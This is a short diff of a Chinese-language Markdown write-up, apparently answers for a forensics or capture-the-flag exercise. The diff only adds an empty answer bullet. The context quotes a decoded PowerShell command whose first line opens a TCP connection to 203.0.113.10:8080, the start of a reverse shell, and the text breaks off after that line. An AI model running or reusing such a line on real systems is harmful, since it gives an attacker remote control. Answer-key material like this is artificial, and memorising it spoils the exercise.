@@ -12,6 +12,7 @@
 ## 2. 核心結論與關鍵答案 (Direct Answers)
 *(直接列出可填入 questions.md 的標準答案，精簡無廢話)*
 
+- **Answer / Conclusion**：
 - **解密後明文指令**：
   ```powershell
   $client = New-Object System.Net.Sockets.TCPClient("203.0.113.10",8080);
